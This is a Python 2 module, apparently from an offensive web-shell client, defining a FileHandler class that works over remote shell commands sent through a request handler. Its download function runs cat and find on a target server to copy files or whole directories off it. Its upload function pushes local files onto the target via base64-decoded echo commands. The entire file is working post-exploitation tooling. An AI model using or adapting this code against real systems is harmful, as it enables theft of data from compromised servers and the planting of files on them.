import os

from core.libs.thirdparty.termcolor import cprint, colored
from core.libs.request_handler import make_request


class FileHandler(object):
    # A method for downloading files from the box
    def download_file(self, rfile_path, lfile_path):
        cmd = 'if [ -e {0} ]; then if [ -f {0} ]; then echo file; else echo dir; fi; fi'.format(rfile_path)
        file_type = make_request.get_page_source(cmd)
        if file_type:
            file_type = file_type[0]

        if file_type == 'file':
            cmd = 'cat {0}'.format(rfile_path)
            try:
                with open(lfile_path, 'w') as dest_file:
                    dest_file.write('\n'.join(make_request.get_page_source(cmd)) + '\n')
                print '\n[+] Successfully downloaded "{0}" to "{1}"'.format(rfile_path, lfile_path)
            except IOError, e:
                cprint('\n[!] Error: {0}'.format(e), 'red')
        elif file_type == 'dir':
            cmd = 'find {0} | while read f;do echo $f;done'.format(rfile_path)
            files = make_request.get_page_source(cmd)
            for file in files:
                cmd = 'if [ -e {0} ]; then if [ -f {0} ]; then echo file; else echo dir; fi; fi'.format(file)
                file_type = make_request.get_page_source(cmd)[0]
                if file_type == 'dir':
                    #folder = os.path.exists(os.path.join(lfile_path, file))  # Didn't like: @download /media/CD /root/
                    folder = lfile_path + file
                    if not os.path.exists(folder):
                        os.makedirs(folder)
                elif file_type == 'file':
                    cmd = 'cat {0}'.format(file)
                    try:
                        #with open(os.path.join(lfile_path, file), 'w') as dest_file:  # Didn't like: @download /media/CD /root/
                        with open(lfile_path + file, 'w') as dest_file:
                            dest_file.write('\n'.join(make_request.get_page_source(cmd)) + '\n')
                    except IOError, e:
                        cprint('\n[!] Error: {0}'.format(e), 'red')
                else:
                    print colored('[!] Coudln\'t download the following file:', 'red'), file
            print colored('\n[+] Downloaded successfully to:', 'green'), lfile_path
        else:
            cprint('\n[!]The file/directory doesn\'t exist or I don\'t have permission', 'red')

    # A method for uploading files to the box
    def upload_file(self, lfile_path, rfile_path):
        with open(lfile_path) as local_file:
            data_to_upload = local_file.read().encode('base64').strip()
            #split the data then join it to escap special chars and new lines
            data_to_upload = ''.join(data_to_upload.splitlines())

        def chuncks(seq, length):
            return [seq[i:i + length] for i in xrange(0, len(seq), length)]

        if len(data_to_upload) > 300 and make_request.method != 'post':
            for i in chuncks(data_to_upload, 200):
                data = 'echo {0}| base64 -d >> {1}'.format(i, rfile_path)
                make_request.get_page_source(data)
        else:
            data = 'echo {0}| base64 -d > {1}'.format(data_to_upload, rfile_path)
            make_request.get_page_source(cmd=data)

        print '[+] Successfully uploaded {0} to {1}'.format(lfile_path, rfile_path)

file_handler = FileHandler()
